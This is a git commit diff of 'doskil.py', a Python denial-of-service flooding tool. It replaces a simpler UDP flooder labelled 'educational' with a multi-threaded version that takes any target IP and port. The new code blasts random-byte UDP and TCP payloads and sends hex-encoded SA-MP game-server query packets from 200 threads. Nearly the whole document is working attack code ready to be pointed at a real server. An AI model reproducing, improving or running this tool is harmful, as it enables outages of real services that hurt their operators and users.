15a2101a1ecd1a5e03362284c9381be7fe6a8c7f
nik-68 <106348996+nik-68@users.noreply.github.com>
2022-08-19 14:26:46 +0300

    Update doskil.py

--- doskil.py
+++ doskil.py
@@ -1,34 +1,159 @@
-import os
 import colorama
 from colorama import Fore
-os.system("clear")
-title = '''
-==============================================================
-  _____   ______  _____      _    _   ____    ____   _____  
- |  __ \ |  ____||  __ \    | |  | | / __ \  / __ \ |  __ \ 
- | |__) || |__   | |  | |   | |__| || |  | || |  | || |  | |
- |  _  / |  __|  | |  | |   |  __  || |  | || |  | || |  | |
- | | \ \ | |____ | |__| |   | |  | || |__| || |__| || |__| |
- |_|  \_\|______||_____/    |_|  |_| \____/  \____/ |_____/ 
-==============================================================
-                    ||BLUESENDPIE||                                                       
-||SIMPLE DDOS INTERFACE MADE BY BLUESENDPIE FOR EDUCATIONAL PURPOSES||                                    
-'''
-print(Fore.RED + title)
-
+import random
+import threading
+import codecs
+import struct
+import time
 import socket
+import sys
+import os
 
-print("Script DDOS simple untuk pendidikan, jangan disalahgunakan!")
-print("Masukan port 0 kalau mau default")
-ip = input('Masukan IP = ')
-port = int(input('Masukan Port (Default: 25565) = '))
+os.system("clear")
+print("""
+\033[36m
+██████╗░██╗░░░██╗██╗░░░░░██╗░░░░░
+██╔══██╗██║░░░██║██║░░░░░██║░░░░░
+██████╔╝██║░░░██║██║░░░░░██║░░░░░
+██╔══██╗██║░░░██║██║░░░░░██║░░░░░
+██║░░██║╚██████╔╝███████╗███████╗
+╚═╝░░╚═╝░╚═════╝░╚══════╝╚══════╝
+""")
 
-if port == 0:
-      port = 25565
+ip = str(input(" INPUT IP: => "))
+port = int(input(" INPUT PORT: => "))
+choice = str(input(" ARE YOU READY? (Y/N): => "))
+times = int(input(" INPUT PACKET: => "))
+threads = int(input(" INPUT THREADINGS: => "))
+fake_ip = '182.21.20.32'
+#Starting Attacking
+Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
+                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
+                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
+                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
+                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
+                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
+                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
+                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
+                       codecs.decode("081e7eda","hex_codec")#cookie port 7784 tambem
+                       ]
+def run():
+	data = random._urandom(1460)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" YOUR ATTACKING SERVER !!!")
+		except:
+			print("[!] SERVER PING IS NOT STABLE !!!")
 
-while True:
-   s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-   s.connect((ip, port))
-   i = 0
-   if i < 10:
-      s.send(b'\x01')
+def run2():
+	data = random._urandom(1204)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" YOUR ATTACKING SERVER!!!")
+		except:
+			s.close()
+			print("[*] SERVER PING IS NOT STABLE")
+            
+
+def run3():
+	data = random._urandom(999)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" YOUR ATTACKING SERVER !!!")
+		except:
+			s.close()
+			print("[*] SERVER PING IS NOT STABLE !!!")
+            
+  
+def run4():
+	data = random._urandom(818)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" YOUR ATTACKING SERVER !!!")
+		except:
+			s.close()
+			print("[*] SERVER PING IS NOT STABLE !!!")
+			
+def run5():
+	data = random._urandom(16)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" YOUR ATTACKING SERVER !!!")
+		except:
+			s.close()
+			print("[*] SERVER PING IS NOT STABLE !!!")
+            
+#Urandom Dan Pacotes
+class MyThread(threading.Thread):
+     def run(self):
+         while True:
+                sock = socket.socket(
+                    socket.AF_INET, socket.SOCK_DGRAM)
+                
+                msg = Pacotes[random.randrange(0,5)]
+                     
+                sock.sendto(msg, (ip, int(port)))
+                
+                
+                if(int(port) == 7777):
+                    sock.sendto(Pacotes[5], (ip, int(port)))
+                elif(int(port) == 7796):
+                    sock.sendto(Pacotes[4], (ip, int(port)))
+                elif(int(port) == 7771):
+                    sock.sendto(Pacotes[6], (ip, int(port)))
+                elif(int(port) == 7784):
+                    sock.sendto(Pacotes[7], (ip, int(port)))
+                    
+                
+
+if __name__ == '__main__':
+    try:
+     for x in range(200):                                    
+            mythread = MyThread()  
+            mythread.start()                                  
+            time.sleep(.1)    
+    except(KeyboardInterrupt):
+         os.system('cls' if os.name == 'nt' else 'clear')
+         
+for y in range(threads):
+	if choice == 'y':
+		th = threading.Thread(target = run)
+		th.start()
+		th = threading.Thread(target = run2)
+		th.start()
+		th = threading.Thread(target = run3)
+		th.start()
+		th = threading.Thread(target = run4)
+		th.start()
+else:
+		th = threading.Thread(target = run5)
+		th.start()
